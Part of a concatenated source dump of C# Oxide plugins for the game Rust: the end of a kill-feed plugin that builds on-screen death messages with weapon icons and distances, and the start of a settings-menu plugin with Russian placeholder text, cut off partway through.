                /*string clanTag = string.Empty;
                if (Clans != null)
                {
                    clanTag = (string)Clans?.Call("GetClanOf", victim);
                    if(!string.IsNullOrEmpty(clanTag))
                        clanTag = "[" + clanTag + "] ";
                }*/

                victimDisplayName = victim.displayName;
            }

            foreach (var perm in Configuration.ColorsNamePlayer)
            {
                if (victim.IsNpc == false)
                {
                    if (permission.UserHasPermission(victim.UserIDString, perm.Key))
                    {
                        victimColorName = perm.Value.ColorDeath;
                    }
                }

                if (initiator.IsNpc == false)
                {
                    if (permission.UserHasPermission(initiator.UserIDString, perm.Key))
                    {
                        initiatorColorName = perm.Value.ColorKill;
                    }
                }
            }

            new DeathNote(victimDisplayName, initiatorDisplayName, weaponInfo, sDistance, victimColorName, initiatorColorName, needRenameVictim, needRenameInitiator);
        }

        private void OnDeath(BaseEntity victim, BasePlayer initiator, HitInfo hitInfo)
        {
            string victimDisplayName = string.Empty;
            string victimColorName = string.Empty;
            string initiatorDisplayName = string.Empty;
            string initiatorColorName = string.Empty;

            bool needRenameVictim = false;
            bool needRenameInitiator = false;

            WeaponInfo weaponInfo = GetWeaponInfo(hitInfo);

            float fDistance = Vector3.Distance(victim.transform.position, initiator.transform.position);
            float sDistance = fDistance > 300 ? 300 : fDistance;

            weaponInfo.IsHeadShot = hitInfo.HitBone == 698017942;

            if (initiator.IsNpc == true || initiator.userID.IsSteamId() == false)
            {
                initiatorDisplayName = "npcplayer";
                needRenameInitiator = true;
            }
            else
            {
                /*string clanTag = string.Empty;
                if (Clans != null)
                {
                    clanTag = (string)Clans?.Call("GetClanOf", initiator);
                    if (!string.IsNullOrEmpty(clanTag))
                        clanTag = "[" + clanTag + "] ";
                }*/

                initiatorDisplayName = initiator.displayName;
            }

            victimDisplayName = victim.ShortPrefabName;
            needRenameVictim = true;

            foreach (var perm in Configuration.ColorsNamePlayer)
            {
                if (initiator.IsNpc == false)
                {
                    if (permission.UserHasPermission(initiator.UserIDString, perm.Key))
                    {
                        initiatorColorName = perm.Value.ColorKill;
                    }
                }
            }

            new DeathNote(victimDisplayName, initiatorDisplayName, weaponInfo, sDistance, victimColorName, initiatorColorName, needRenameVictim, needRenameInitiator);
        }

        private WeaponInfo GetWeaponInfo(HitInfo hitInfo)
        {
            WeaponInfo weaponInfo = new WeaponInfo()
            {
                WeaponName = string.Empty,
                WeaponMods = new string[] { },
                IsHeadShot = false
            };

            if (hitInfo.Weapon != null)
            {
                Item itemWeapon = hitInfo.Weapon.GetItem();
                if (itemWeapon != null)
                {
                    weaponInfo.WeaponName = itemWeapon.info.shortname;
                    if (itemWeapon.contents != null)
                    {
                        weaponInfo.WeaponMods = itemWeapon.contents.itemList.Count > 0 ? itemWeapon.contents.itemList.Select(x => x.info.shortname).ToArray() : new string[] { };
                    }
                }
            }

            if (string.IsNullOrEmpty(weaponInfo.WeaponName) == true && hitInfo.ProjectilePrefab != null)
            {
                if (hitInfo.ProjectilePrefab.sourceWeaponPrefab != null)
                {
                    Item itemWeapon = hitInfo.ProjectilePrefab.sourceWeaponPrefab.GetItem();
                    if (itemWeapon != null)
                    {
                        weaponInfo.WeaponName = itemWeapon.info.shortname;
                        if (itemWeapon.contents != null)
                        {
                            weaponInfo.WeaponMods = itemWeapon.contents.itemList.Count > 0 ? itemWeapon.contents.itemList.Select(x => x.info.shortname).ToArray() : new string[] { };
                        }
                    }
                }
            }

            if (string.IsNullOrEmpty(weaponInfo.WeaponName) == true && hitInfo.WeaponPrefab != null)
            {
                if (prefabID2Item.TryGetValue(hitInfo.WeaponPrefab.prefabID, out weaponInfo.WeaponName) == false)
                {
                    prefabName2Item.TryGetValue(hitInfo.WeaponPrefab.ShortPrefabName, out weaponInfo.WeaponName);
                }
            }

            if (string.IsNullOrEmpty(weaponInfo.WeaponName))
            {
                weaponInfo.WeaponName = hitInfo.damageTypes.GetMajorityDamageType().ToString();
            }

            return weaponInfo;
        }

        private void OnDeath(BasePlayer victim, BaseEntity initiator, HitInfo hitInfo)
        {
            string victimDisplayName = string.Empty;
            string victimColorName = string.Empty;
            string initiatorDisplayName = string.Empty;
            bool needRenameVictim = false;
            bool needRenameInitiator = false;

            WeaponInfo weaponInfo = GetWeaponInfoFromPrefab(initiator);

            float fDistance = Vector3.Distance(victim.transform.position, initiator.transform.position);
            float sDistance = fDistance > 300 ? 300 : fDistance;

            if (initiator != null)
            {
                initiatorDisplayName = initiator.ShortPrefabName;

                if (lang.GetMessage(initiatorDisplayName, this, null) == initiatorDisplayName)
                {
                    LogToFile("DeathMessages", "InitiatorDisplayName: " + initiator.ShortPrefabName, this, true);
                    return;
                }

                needRenameInitiator = true;
            }

            if (victim.IsNpc == true || victim.userID.IsSteamId() == false)
            {
                victimDisplayName = "npcplayer";
                needRenameVictim = true;
            }

            if (victim.IsNpc == false)
            {
                victimDisplayName = victim.displayName;
            }

            foreach (var perm in Configuration.ColorsNamePlayer)
            {
                if (!victim.IsNpc)
                {
                    if (permission.UserHasPermission(victim.UserIDString, perm.Key))
                    {
                        victimColorName = perm.Value.ColorDeath;
                    }
                }
            }

            new DeathNote(victimDisplayName, initiatorDisplayName, weaponInfo, sDistance, victimColorName, "#FFFFF", needRenameVictim, needRenameInitiator);
        }

        private WeaponInfo GetWeaponInfoFromPrefab(BaseEntity initiator)
        {
            WeaponInfo weaponInfo = new WeaponInfo()
            {
                WeaponName = string.Empty,
                WeaponMods = new string[0],
                IsHeadShot = false
            };

            if (initiator is AutoTurret)
            {
                AutoTurret autoTurret = initiator as AutoTurret;
                Item itemWeapon = autoTurret.inventory.itemList.Where(x => x.info.category == ItemCategory.Weapon).FirstOrDefault();
                if (itemWeapon != null)
                {
                    if (itemWeapon != null)
                    {
                        weaponInfo.WeaponName = itemWeapon.info.shortname;
                        if (itemWeapon.contents != null)
                        {
                            weaponInfo.WeaponMods = itemWeapon.contents.itemList.Count > 0 ? itemWeapon.contents.itemList.Select(x => x.info.shortname).ToArray() : new string[] { };
                        }
                    }
                }
            }

            if (string.IsNullOrEmpty(weaponInfo.WeaponName) == true)
            {
                if (prefabID2Item.TryGetValue(initiator.prefabID, out weaponInfo.WeaponName) == false)
                {
                    prefabName2Item.TryGetValue(initiator.ShortPrefabName, out weaponInfo.WeaponName);
                }
            }

            if (string.IsNullOrEmpty(weaponInfo.WeaponName) == true)
            {
                weaponInfo.WeaponName = initiator.ShortPrefabName;
            }

            return weaponInfo;
        }

        public static double GetStringWidth(string message, string font, int fontSize)
        {
            if (message.Contains("</color>"))
            {
                message = message.Substring(16);
                message = message.Replace("</color>", "");
            }

            System.Drawing.Font stringFont = new System.Drawing.Font(font, fontSize, System.Drawing.FontStyle.Bold);
            using (System.Drawing.Bitmap tempImage = new System.Drawing.Bitmap(200, 200))
            {
                System.Drawing.SizeF stringSize = System.Drawing.Graphics.FromImage(tempImage).MeasureString(message, stringFont);
                return stringSize.Width;
            }
        }

        public static int GetStringLength(string message)
        {
            if (message.Contains("</color>"))
            {
                message = message.Substring(16);
                message = message.Replace("</color>", "");
            }

            return message.Length;
        }
        #endregion

        #region KillFeed Controler
        private static Timer DeathNotesTimer;

        public class DeathNote
        {
            public string VictimName { get; set; }
            public string InitiatorName { get; set; }

            public WeaponInfo WeaponInfo { get; set; }

            public bool RenameVictim { get; set; }
            public bool RenameInitiator { get; set; }

            public Dictionary<string, string> UIStrings = new Dictionary<string, string>();

            public string Distance { get; set; }

            public static List<DeathNote> DeathNotes = new List<DeathNote>();

            public DeathNote(string victimName, string initiatorName, WeaponInfo weaponInfo, float distance, string colorVictim = "", string colorInitiator = "", bool needRenameVictim = false, bool needRenameInitiator = false)
            {
                if (needRenameVictim)
                    this.VictimName = $"{victimName}";
                else
                    this.VictimName = $"<color={(string.IsNullOrEmpty(colorVictim) ? "#ffffff" : colorVictim)}>{victimName}</color>";

                if (needRenameInitiator)
                    this.InitiatorName = $"{initiatorName}";
                else
                    this.InitiatorName = $"<color={(string.IsNullOrEmpty(colorInitiator) ? "#ffffff" : colorInitiator)}>{initiatorName}</color>";

                this.WeaponInfo = weaponInfo;
                this.Distance = distance.ToString("0.0");
                this.RenameVictim = needRenameVictim;
                this.RenameInitiator = needRenameInitiator;

                if (DeathNotes.Count > Instance.Configuration.MaxKillsForBar - 1)
                    DeathNotes.Remove(DeathNotes.LastOrDefault());

                if (DeathNotes.Count == 0)
                    DeathNotes.Add(this);
                else
                    DeathNotes.Insert(0, this);

                UpdateUI();
                UpdateTimer();
            }
        }

        public static void UpdateUI()
        {
            string deathContainer = Instance.GetUIContainerString();
            Dictionary<string, string[]> deathNotes = new Dictionary<string, string[]>();
            for (int j = 0; j < Instance.lang.GetLanguages(Instance).Length; j++)
            {
                string lang = Instance.lang.GetLanguages(Instance).ElementAt(j);
                deathNotes[lang] = new string[Instance.Configuration.MaxKillsForBar];
                for (int i = 0; i < DeathNote.DeathNotes.Count; i++)
                {
                    string initiatorName = DeathNote.DeathNotes[i].InitiatorName;
                    string victimName = DeathNote.DeathNotes[i].VictimName;

                    if (DeathNote.DeathNotes[i].RenameInitiator)
                    {
                        if (Instance.lang.GetMessages(lang, Instance).ContainsKey(initiatorName))
                            initiatorName = Instance.lang.GetMessages(lang, Instance)[initiatorName];
                    }

                    if (DeathNote.DeathNotes[i].RenameVictim)
                    {
                        if (Instance.lang.GetMessages(lang, Instance).ContainsKey(victimName))
                            victimName = Instance.lang.GetMessages(lang, Instance)[victimName];
                    }

                    double initiatorWidth = GetStringWidth(initiatorName, "Roboto condensed", 12);
                    double victimWidth = GetStringWidth(victimName, "Roboto condensed", 12);

                    int initiatorLength = GetStringLength(initiatorName);
                    if (initiatorLength <= 2)
                    {
                        initiatorWidth *= 2;
                    }
                    else if (initiatorLength <= 5)
                    {
                        initiatorWidth *= 1;
                    }
                    else if (initiatorLength <= 10)
                    {
                        initiatorWidth *= 0.8;
                    }
                    else
                    {
                        initiatorWidth *= 0.7;
                    }

                    int victimLength = GetStringLength(victimName);
                    if (victimLength <= 2)
                    {
                        victimWidth *= 2;
                    }
                    else if (victimLength <= 5)
                    {
                        victimWidth *= 1;
                    }
                    else if (victimLength <= 10)
                    {
                        victimWidth *= 0.8;
                    }
                    else
                    {
                        victimWidth *= 0.7;
                    }

                    deathNotes[lang][i] = Instance.GetReplacedString(i,
                    victimName,
                    initiatorName,
                    DeathNote.DeathNotes[i].WeaponInfo.WeaponName,
                    DeathNote.DeathNotes[i].WeaponInfo.WeaponMods,
                    DeathNote.DeathNotes[i].WeaponInfo.IsHeadShot,
                    DeathNote.DeathNotes[i].Distance,
                    victimWidth,
                    initiatorWidth);
                }
            }

            foreach (var player in BasePlayer.activePlayerList)
            {
                CuiHelper.DestroyUi(player, "DeathMessages");
                CuiHelper.AddUi(player, deathContainer);

                string playerLang = Instance.lang.GetLanguage(player.UserIDString);

                if (deathNotes.ContainsKey(playerLang) == false)
                    playerLang = "en";

                for (int i = 0; i < deathNotes[playerLang].Length; i++)
                {
                    CuiHelper.AddUi(player, deathNotes[playerLang][i]);
                }
            }
        }

        public static void UpdateTimer()
        {
            if (DeathNotesTimer != null)
                DeathNotesTimer.Destroy();

            DeathNotesTimer = Instance.timer.In(5f, () =>
            {
                if (DeathNote.DeathNotes.Count > 0)
                {
                    DeathNote.DeathNotes.Remove(DeathNote.DeathNotes.LastOrDefault());

                    UpdateUI();
                    UpdateTimer();
                }
                else
                {
                    DeathNotesTimer.Destroy();
                }
            });
        }
        #endregion

        #region UI
        private string defaultString = string.Empty;

        private string defaultUIContainerString = string.Empty;

        private string defaultUIHeadShotString = string.Empty;

        private string defaultUIModString = string.Empty;

        private string GetReplacedString(int stringPosition, string victimName, string initiatorName, string weaponName, string[] weaponMods, bool isHeadShot, string distance, double victimWidth, double initiatorWidth)
        {
            string killString = GetUIString();
            double iconsOffset = 0.0;

            if (Configuration.ShowHeadShots && isHeadShot)
            {
                string headShotString = GetUIHeadShotString();
                iconsOffset += 21.0;
                headShotString = headShotString.Replace($"[{{i}}]", stringPosition.ToString());
                headShotString = headShotString.Replace($"{{WeaponImage}}", GetImage("headshot", 1336));
                headShotString = headShotString.Replace($"{{WeaponOffsetMinX}}", $"{5 + initiatorWidth + iconsOffset}");
                headShotString = headShotString.Replace($"{{WeaponOffsetMaxX}}", $"{5 + initiatorWidth + iconsOffset + 18}");
                headShotString = headShotString.Substring(1, headShotString.Length - 2);
                headShotString = "," + headShotString;
                killString = killString.Insert(killString.Length - 1, headShotString);
            }

            if (Configuration.ShowWeaponMods && weaponMods.Length > 0)
            {
                foreach (var weaponMod in weaponMods)
                {
                    string weaponModString = GetUIModString();
                    iconsOffset += 18.0;
                    weaponModString = weaponModString.Replace($"[{{i}}]", stringPosition.ToString());
                    weaponModString = weaponModString.Replace($"{{WeaponImage}}", GetImage(weaponMod, 666));
                    weaponModString = weaponModString.Replace($"{{WeaponOffsetMinX}}", $"{5 + initiatorWidth + iconsOffset + 6}");
                    weaponModString = weaponModString.Replace($"{{WeaponOffsetMaxX}}", $"{5 + initiatorWidth + iconsOffset + 18}");
                    weaponModString = weaponModString.Substring(1, weaponModString.Length - 2);
                    weaponModString = "," + weaponModString;
                    killString = killString.Insert(killString.Length - 1, weaponModString);
                }
            }

            ItemDefinition item;
            if (ItemManager.itemDictionaryByName.TryGetValue(weaponName, out item) == false)
            {
                weaponName = "skull.human";
            }

            killString = killString.Replace($"[{{i}}]", stringPosition.ToString());

            killString = killString.Replace($"{{MainOffsetMinX}}", $"-{victimWidth + initiatorWidth + iconsOffset + 18 + 15 + 6 + 50}");
            killString = killString.Replace($"{{MainOffsetMinY}}", $"{-66 + (Configuration.UI.OffsetY) - stringPosition * 25}");
            killString = killString.Replace($"{{MainOffsetMaxY}}", $"{-46 + (Configuration.UI.OffsetY) - stringPosition * 25}");
            killString = killString.Replace($"{{InitiatorName}}", initiatorName);
            killString = killString.Replace($"{{InitiatorOffsetMaxX}}", initiatorWidth.ToString());
            killString = killString.Replace($"{{VictimName}}", victimName);
            killString = killString.Replace($"{{VictimOffsetMinX}}", $"{5 + initiatorWidth + iconsOffset + 18 + 5}");
            killString = killString.Replace($"{{VictimOffsetMaxX}}", $"{5 + initiatorWidth + iconsOffset + 18 + 5 + victimWidth}");
            killString = killString.Replace($"{{DistanceOffsetMinX}}", $"{5 + initiatorWidth + iconsOffset + 18 + 5 + victimWidth}");
            killString = killString.Replace($"{{DistanceOffsetMaxX}}", $"{5 + initiatorWidth + iconsOffset + 18 + 5 + victimWidth + 60}");
            killString = killString.Replace($"{{DistanceM}}", distance + "m");
            killString = killString.Replace($"{{DistanceMOffsetMinX}}", $"{5 + initiatorWidth + iconsOffset + 18 + 5 + victimWidth}");
            killString = killString.Replace($"{{DistanceMOffsetMaxX}}", $"{5 + initiatorWidth + iconsOffset + 18 + 5 + victimWidth + 60}");
            killString = killString.Replace($"{{WeaponImage}}", GetImage(weaponName, 666));
            killString = killString.Replace($"{{WeaponOffsetMinX}}", $"{5 + initiatorWidth}");
            killString = killString.Replace($"{{WeaponOffsetMaxX}}", $"{5 + initiatorWidth + 18}");


            return killString;
        }

        private string GetUIContainerString()
        {
            if (string.IsNullOrEmpty(defaultUIContainerString))
            {
                defaultUIContainerString = CreateUIContainerString();
            }

            return defaultUIContainerString;
        }

        private string GetUIString()
        {
            if (string.IsNullOrEmpty(defaultString))
            {
                defaultString = CreateUIString();
            }

            return defaultString;
        }

        private string GetUIHeadShotString()
        {
            if (string.IsNullOrEmpty(defaultUIHeadShotString))
            {
                defaultUIHeadShotString = CreateUIHeadShotString();
            }

            return defaultUIHeadShotString;
        }

        private string GetUIModString()
        {
            if (string.IsNullOrEmpty(defaultUIModString))
            {
                defaultUIModString = CreateUIModString();
            }

            return defaultUIModString;
        }

        private string CreateUIContainerString()
        {
            CuiElementContainer Container = new CuiElementContainer();
            Container.Add(new CuiElement
            {
                Name = "DeathMessages",
                Parent = "Hud",
                Components =
                    {
                        new CuiImageComponent
                        {
                            Color = "0 0 0 0",
                        },
                        new CuiRectTransformComponent
                        {
                            AnchorMin = "1 1",
                            AnchorMax = "1 1",
                        }
                    }
            });

            return Container.ToJson();
        }

        private string CreateUIString()
        {
            CuiElementContainer Container = new CuiElementContainer();
            Container.Add(new CuiElement
            {
                Name = $"DeathMessages.[{{i}}]",
                Parent = "DeathMessages",
                Components =
                {
                    new CuiImageComponent
                    {
                        Color = HexToRustFormat(Configuration.UI.BackgroundColor),
                    },
                    new CuiRectTransformComponent
                    {
                        AnchorMin = "1 1",
                        AnchorMax = "1 1",
                        OffsetMin = $"{{MainOffsetMinX}} {{MainOffsetMinY}}",
                        OffsetMax = $"-6 {{MainOffsetMaxY}}",
                    }
                }
            });
            Container.Add(new CuiElement
            {
                Name = "DeathMessages.Initiator",
                Parent = $"DeathMessages.[{{i}}]",
                Components =
                        {
                            new CuiTextComponent
                            {
                                Text = $"<color=#FFFFFF>{{InitiatorName}}</color>",
                                Align = TextAnchor.MiddleCenter,
                                Font = "robotocondensed-bold.ttf",
                                FontSize = 12
                            },
                            new CuiRectTransformComponent
                            {
                                AnchorMin = $"0 0.5",
                                AnchorMax = $"0 0.5",
                                OffsetMin = $"5 -10",
                                OffsetMax = $"{{InitiatorOffsetMaxX}} 10",
                            },
                            new CuiOutlineComponent
                            {
                                Color = "0 0 0 1",
                                Distance = "-0.5 0.5"
                            }
                        }
            });
            Container.Add(new CuiElement
            {
                Name = "DeathMessages.Victim",
                Parent = $"DeathMessages.[{{i}}]",
                Components =
                        {
                            new CuiTextComponent
                            {
                                Text = $"<color=#FFFFFF>{{VictimName}}</color>",
                                Align = TextAnchor.MiddleCenter,
                                Font = "robotocondensed-bold.ttf",
                                FontSize = 12
                            },
                            new CuiRectTransformComponent
                            {
                                AnchorMin = $"0 0.5",
                                AnchorMax = $"0 0.5",
                                OffsetMin = $"{{VictimOffsetMinX}} -10",
                                OffsetMax = $"{{VictimOffsetMaxX}} 10",
                            },
                            new CuiOutlineComponent
                            {
                                Color = "0 0 0 1",
                                Distance = "-0.5 0.5"
                            }
                        }
            });
            Container.Add(new CuiElement
            {
                Name = $"DeathMessages.Distance",
                Parent = $"DeathMessages.[{{i}}]",
                Components =
                            {
                                new CuiRawImageComponent
                                {
                                    Color = HexToRustFormat(Configuration.UI.DistanceColor),
                                    Material = "assets/icons/iconmaterial.mat",
                                    Sprite = $"assets/icons/subtract.png",
                                },
                                new CuiRectTransformComponent
                                {
                                    AnchorMin = $"0 0.5",
                                    AnchorMax = $"0 0.5",
                                    OffsetMin = $"{{DistanceOffsetMinX}} -30",
                                    OffsetMax = $"{{DistanceOffsetMaxX}} 30",
                                }
                            }
            });
            Container.Add(new CuiElement
            {
                Name = "DeathMessages.DistanceM",
                Parent = $"DeathMessages.[{{i}}]",
                Components =
                        {
                            new CuiTextComponent
                            {
                                Text = $"<color=#404040>{{DistanceM}}</color>",
                                Align = TextAnchor.MiddleCenter,
                                Font = "robotocondensed-bold.ttf",
                                FontSize = 12
                            },
                            new CuiRectTransformComponent
                            {
                                AnchorMin = $"0 0.5",
                                AnchorMax = $"0 0.5",
                                OffsetMin = $"{{DistanceMOffsetMinX}} -10",
                                OffsetMax = $"{{DistanceMOffsetMaxX}} 10",
                            },
                            new CuiOutlineComponent
                            {
                                Color = "1 1 1 1",
                                Distance = "-0.5 0.5"
                            }
                        }
            });
            Container.Add(new CuiElement
            {
                Name = $"DeathMessages.WeaponImage",
                Parent = $"DeathMessages.[{{i}}]",
                Components =
                            {
                                new CuiRawImageComponent
                                {
                                    Png = $"{{WeaponImage}}",
                                },
                                new CuiRectTransformComponent
                                {
                                    AnchorMin = $"0 0.5",
                                    AnchorMax = $"0 0.5",
                                    OffsetMin = $"{{WeaponOffsetMinX}} -9",
                                    OffsetMax = $"{{WeaponOffsetMaxX}} 9",
                                },
                                new CuiOutlineComponent
                                {
                                    Color = "0 0 0 1",
                                    Distance = "-0.5 0.5"
                                }
                            }
            });

            return Container.ToJson();
        }

        private string CreateUIModString()
        {
            CuiElementContainer Container = new CuiElementContainer();

            Container.Add(new CuiElement
            {
                Name = $"DeathMessages.WeaponMod",
                Parent = $"DeathMessages.[{{i}}]",
                Components =
                            {
                                new CuiRawImageComponent
                                {
                                    Png = $"{{WeaponImage}}",
                                },
                                new CuiRectTransformComponent
                                {
                                    AnchorMin = $"0 0.5",
                                    AnchorMax = $"0 0.5",
                                    OffsetMin = $"{{WeaponOffsetMinX}} -6",
                                    OffsetMax = $"{{WeaponOffsetMaxX}} 6",
                                },
                                new CuiOutlineComponent
                                {
                                    Color = "0 0 0 1",
                                    Distance = "-0.5 0.5"
                                }
                            }
            });

            return Container.ToJson();
        }

        private string CreateUIHeadShotString()
        {
            CuiElementContainer Container = new CuiElementContainer();

            Container.Add(new CuiElement
            {
                Name = $"DeathMessages.WeaponHeadshot",
                Parent = $"DeathMessages.[{{i}}]",
                Components =
                            {
                                new CuiRawImageComponent
                                {
                                    Png = $"{{WeaponImage}}",
                                },
                                new CuiRectTransformComponent
                                {
                                    AnchorMin = $"0 0.5",
                                    AnchorMax = $"0 0.5",
                                    OffsetMin = $"{{WeaponOffsetMinX}} -9",
                                    OffsetMax = $"{{WeaponOffsetMaxX}} 9",
                                },
                                new CuiOutlineComponent
                                {
                                    Color = "0 0 0 1",
                                    Distance = "-0.5 0.5"
                                }
                            }
            });

            return Container.ToJson();
        }
        #endregion

        #region Help
        public static StringBuilder sb = new StringBuilder();
        private static string HexToRustFormat(string hex)
        {
            Color color;
            ColorUtility.TryParseHtmlString(hex, out color);
            sb.Clear();
            return sb.AppendFormat("{0:F2} {1:F2} {2:F2} {3:F2}", color.r, color.g, color.b, color.a).ToString();
        }
        #endregion
    }
}


// --- End of file: DeathMessages.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/HudRust/Settings.cs ---
// --- Original Local Path: HudRust/Settings.cs ---

﻿using Oxide.Core.Plugins;
using Oxide.Game.Rust.Cui;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.Linq;
using UnityEngine;

namespace Oxide.Plugins
{
    [Info("Settings", "VooDoo", "1.0.0")]
    [Description("Settings switch's")]
    public class Settings : RustPlugin
    {
        [PluginReference] Plugin XMenu;

        #region Config
        public Dictionary<ulong, Dictionary<int, UserSettings>> userSettings = new Dictionary<ulong, Dictionary<int, UserSettings>>();
        public class UserSettings
        {
            public bool isOn;
            public Dictionary<int, UserSettings> settings;
        }

        private PluginConfig config;
        private class PluginConfig
        {
            public ColorConfig colorConfig;
            public class ColorConfig
            {
                public string menuContentHighlighting;
                public string menuContentHighlightingalternative;

                public string gradientColor;
            }

            public Dictionary<int, PluginSettings> pluginSettings;
            public class PluginSettings
            {
                public string commandDescription;
                public string command;
                public bool isChecked;
                public bool onlyOne;

                public Dictionary<int, PluginSettings> subSettings;
            }
        }

        private void Init()
        {
            config = Config.ReadObject<PluginConfig>();
        }

        protected override void LoadDefaultConfig()
        {
            Config.WriteObject(GetDefaultConfig(), true);
        }

        private PluginConfig GetDefaultConfig()
        {
            return new PluginConfig
            {
                colorConfig = new PluginConfig.ColorConfig()
                {
                    menuContentHighlighting = "#0000007f",
                    menuContentHighlightingalternative = "#FFFFFF10",

                    gradientColor = "#00000099",
                },

                pluginSettings = new Dictionary<int, PluginConfig.PluginSettings>()
                {
                    [0] = new PluginConfig.PluginSettings
                    {
                        commandDescription = "Описание пункта в меню настроек",
                        command = "chat.say Switch",
                        isChecked = false,
                        onlyOne = true,
                        subSettings = new Dictionary<int, PluginConfig.PluginSettings>()
                        {
                            [0] = new PluginConfig.PluginSettings
                            {
                                commandDescription = "Описание подпункта #1",
                                command = "chat.say SubSwitch1",
                                isChecked = true,
                                subSettings = null,
                                onlyOne = false
                            },
                            [1] = new PluginConfig.PluginSettings
                            {
                                commandDescription = "Описание подпункта #2",
                                command = "chat.say SubSwitch2",
                                isChecked = true,
                                subSettings = null,
                                onlyOne = false
                            },
                            [2] = new PluginConfig.PluginSettings
                            {
                                commandDescription = "Описание подпункта #3",
                                command = "chat.say SubSwitch3",
                                isChecked = true,
                                subSettings = null,
                                onlyOne = false
                            }
                        }
                     },
                    [1] = new PluginConfig.PluginSettings
                    {
                        commandDescription = "Описание пункта в меню настроек",
                        command = "chat.say Switch",
                        isChecked = false,
                        onlyOne = false,
                        subSettings = new Dictionary<int, PluginConfig.PluginSettings>()
                        {
                            [0] = new PluginConfig.PluginSettings
                            {
                                commandDescription = "Описание подпункта #1",
                                command = "chat.say SubSwitch1",
                                isChecked = true,
                                subSettings = null,
                                onlyOne = false
                            },
                            [1] = new PluginConfig.PluginSettings
                            {
                                commandDescription = "Описание подпункта #2",
                                command = "chat.say SubSwitch2",
                                isChecked = true,
                                subSettings = null,
                                onlyOne = false
                            },
                            [2] = new PluginConfig.PluginSettings
                            {
                                commandDescription = "Описание подпункта #3",
                                command = "chat.say SubSwitch3",
                                isChecked = true,
                                subSettings = null,
                                onlyOne = false
                            }
                        }
                    },
                    [2] = new PluginConfig.PluginSettings
                    {
                        commandDescription = "Описание пункта в меню настроек",
                        command = "chat.say Switch",
                        isChecked = false,
                        onlyOne = true,
                        subSettings = new Dictionary<int, PluginConfig.PluginSettings>()
                        {
                            [0] = new PluginConfig.PluginSettings
                            {
                                commandDescription = "Описание подпункта #1",
                                command = "chat.say SubSwitch1",
                                isChecked = true,
                                subSettings = null,
                                onlyOne = false
                            },
                            [1] = new PluginConfig.PluginSettings
                            {
                                commandDescription = "Описание подпункта #2",
                                command = "chat.say SubSwitch2",
                                isChecked = true,
                                subSettings = null,
                                onlyOne = false
                            },
                            [2] = new PluginConfig.PluginSettings
                            {
                                commandDescription = "Описание подпункта #3",
                                command = "chat.say SubSwitch3",
                                isChecked = true,
                                subSettings = null,
                                onlyOne = false
                            }
                        }
                    }
                }
            };
        }
        #endregion

        #region Layers
        public const string MenuLayer = "XMenu";
        public const string MenuItemsLayer = "XMenu.MenuItems";
        public const string MenuSubItemsLayer = "XMenu.MenuSubItems";
        public const string MenuContent = "XMenu.Content";
        #endregion


        Timer TimerInitialize;
        private void OnServerInitialized()
        {
            TimerInitialize = timer.Every(5f, () =>
            {
                if (XMenu.IsLoaded)
                {
                    XMenu.Call("API_RegisterSubMenu", this.Name, "Main", "Настройки", "RenderSettings", null);

                    int SettingsID = (int)XMenu.Call("API_GetSubMenuID", "Main", "Настройки");
                    cmd.AddChatCommand("settings", this, (p, cmd, args) => rust.RunClientCommand(p, $"custommenu true Main {SettingsID}"));

                    TimerInitialize.Destroy();
                }
            });

            foreach (var p in BasePlayer.activePlayerList) { OnPlayerConnected(p); }
        }

        private void OnPlayerConnected(BasePlayer player)
        {
            if (player == null)
                return;

            if (player.IsReceivingSnapshot)
            {
                timer.In(1f, () => OnPlayerConnected(player));
                return;
            }

            if (!userSettings.ContainsKey(player.userID))
            {
                userSettings.Add(player.userID, new Dictionary<int, UserSettings>());

                foreach(var settings in config.pluginSettings)
                {
                    userSettings[player.userID].Add(settings.Key, new UserSettings()
                    {
                            isOn = settings.Value.isChecked,
                            settings = new Dictionary<int, UserSettings>()
                    });

                    foreach(var subSettings in settings.Value.subSettings)
                    {
                        userSettings[player.userID][settings.Key].settings.Add(subSettings.Key, new UserSettings()
                        {
                            isOn = subSettings.Value.isChecked,
                            settings = null
                        });
                    }
                }
            }
            else
            {
                foreach (var settings in config.pluginSettings)
                {
                    if (!userSettings[player.userID].ContainsKey(settings.Key))
                    {
                        userSettings[player.userID].Add(settings.Key, new UserSettings()
                        {
                            isOn = settings.Value.isChecked,
                            settings = new Dictionary<int, UserSettings>()
                        });
                    }

                    foreach (var subSettings in settings.Value.subSettings)
                    {
                        if (!userSettings[player.userID][settings.Key].settings.ContainsKey(subSettings.Key))
                        {
                            userSettings[player.userID][settings.Key].settings.Add(subSettings.Key, new UserSettings()
                            {
                                isOn = subSettings.Value.isChecked,
                                settings = null
                            });
                        }
                    }
                }
            }
        }

        private void RenderSettings(ulong userID, object[] objects)
        {
            CuiElementContainer Container = (CuiElementContainer)objects[0];
            bool FullRender = (bool)objects[1];
            string Name = (string)objects[2];
            int ID = (int)objects[3];
            int Page = (int)objects[4];

            Container.Add(new CuiElement
            {
                Name = MenuContent,
                Parent = MenuLayer,
                Components =
                    {
                        new CuiImageComponent
                        {
                            Color = "0 0 0 0",
                        },
                        new CuiRectTransformComponent
                        {
                            AnchorMin = "0.5 0.5",
                            AnchorMax = "0.5 0.5",
                            OffsetMin = "-215 -230",
                            OffsetMax = "500 270"
                        },
                    }
            });
            Container.Add(new CuiElement
            {
                Name = MenuContent + ".Info",
                Parent = MenuContent,
                Components =
                    {
                        new CuiImageComponent
                        {
                            Color = HexToRustFormat(config.colorConfig.menuContentHighlighting),
                        },
                        new CuiRectTransformComponent
                        {
                            AnchorMin = "0 1",
                            AnchorMax = "0 1",
                            OffsetMin = "80 -460",
                            OffsetMax = "630 -10"
                        }
                    }
            });

            for(int i = 0, x = 0; i < config.pluginSettings.Count; i++)
            {
                string text = $"<color=#FFFFFF66>☐  {config.pluginSettings.ElementAt(i).Value.commandDescription}</color>";
                if(userSettings[userID][config.pluginSettings.ElementAt(i).Key].isOn)
                    text = $"<color=#FFFFFF>☑  {config.pluginSettings.ElementAt(i).Value.commandDescription}</color>";

                Container.Add(new CuiElement
                {
                    Name = MenuContent + ".Info" + $".{i}.-1",
                    Parent = MenuContent + ".Info",
                    Components =
                            {
                                new CuiTextComponent
                                {
                                    Text = text,
                                    Align = TextAnchor.MiddleLeft,
                                    FontSize = 16,
                                    Font = "robotocondensed-regular.ttf",
                                },
                                new CuiRectTransformComponent
                                {
                                    AnchorMin = "0 1",
                                    AnchorMax = "0 1",
                                    OffsetMin = $"30 {-50 - x * 25}",
